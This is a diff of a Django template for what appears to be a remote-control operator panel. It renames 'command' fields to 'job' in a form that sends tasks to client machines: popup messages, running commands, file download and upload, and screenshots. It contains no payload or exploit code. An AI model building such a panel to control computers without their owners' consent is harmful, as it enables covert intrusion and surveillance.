@@ -22,31 +22,31 @@
         </pre>
     </div>
     <div id="form_area" class="form-area">
-        <form id="command_form">
+        <form id="job_form">
             {% csrf_token %}
             {{ form.non_field_errors }}
             {{ form.source.errors }}
             {{ form.source }}
-            <div id="form_area_command_id_box" class="form-area-command-id-box">
-                {{ form.command_id.label_tag }}
-                {{ form.command_id.errors }}
-                {{ form.command_id }}
+            <div id="form_area_job_id_box" class="form-area-job-id-box">
+                {{ form.job_id.label_tag }}
+                {{ form.job_id.errors }}
+                {{ form.job_id }}
             </div>
             <div id="form_area_client_id_box" class="form-area-client-id-box">
                 {{ form.client_id.label_tag }}
                 {{ form.client_id.errors }}
                 {{ form.client_id }}
             </div>
-            <div id="form_area_command_box" class="form-area-command-box">
-                {{ form.command.label_tag }}
-                {{ form.command.errors }}
-                {{ form.command }}
+            <div id="form_area_job_box" class="form-area-job-box">
+                {{ form.job.label_tag }}
+                {{ form.job.errors }}
+                {{ form.job }}
             </div>
             <div id="form_area_initial_args_box" class="form-area-initial-args-box">
                 <label>Command args:</label>
                 <p>Please select radio button with type of command to see required arguments</p>
             </div>
-            <div id="form_area_popup_args_box" class="form-area-command-args-box">
+            <div id="form_area_popup_args_box" class="form-area-job-args-box">
                 <label>Popup args:</label>
                 <div class="form-area-arg-field">
                     <label for="title">Title: </label>
@@ -57,7 +57,7 @@
                     <textarea name="text" id="text"></textarea>
                 </div>
             </div>
-            <div id="form_area_run_command_args_box" class="form-area-command-args-box">
+            <div id="form_area_run_command_args_box" class="form-area-job-args-box">
                 <label>
                     Run command args:
                     <a href="#" id="add_input">+</a>
@@ -75,7 +75,7 @@
                     <textarea name="arg0" id="arg0"></textarea>
                 </div>
             </div>
-            <div id="form_area_file_download_args_box" class="form-area-command-args-box">
+            <div id="form_area_file_download_args_box" class="form-area-job-args-box">
                 <label>Download file args</label>
                 <div class="form-area-arg-field">
                     <label for="url">URL:</label>
@@ -93,23 +93,23 @@
                      </select>
                 </div>
             </div>
-            <div id="form_area_screenshot_args_box" class="form-area-command-args-box">
+            <div id="form_area_screenshot_args_box" class="form-area-job-args-box">
                 <label>Screenshot args:</label>
                 <p>Screenshot command has no args</p>
             </div>
-            <div id="form_area_file_upload_args_box" class="form-area-command-args-box">
+            <div id="form_area_file_upload_args_box" class="form-area-job-args-box">
                 <label>Upload file args</label>
                 <div class="form-area-arg-field">
-                    <label for="file_path">Save path on remote PC:</label>
+                    <label for="file_path">File path:</label>
                     <textarea name="file_path"  id="file_path"></textarea>
                 </div>
             </div>
-            <div id="form_area_command_args_box" class="form-area-command-args-box">
-                {{ form.command_args.label_tag }}
-                {{ form.command_args.errors }}
-                {{ form.command_args }}
+            <div id="form_area_command_args_box" class="form-area-job-args-box">
+                {{ form.job_args.label_tag }}
+                {{ form.job_args.errors }}
+                {{ form.job_args }}
             </div>
-            <button id="form_area_send_command" class="form-area-send-command" type="submit">GO!</button>
+            <button id="form_area_submit_job" class="form-area-submit-job" type="submit">GO!</button>
         </form>
     </div>
     <div id="ajax_status" class="ajax-status" >
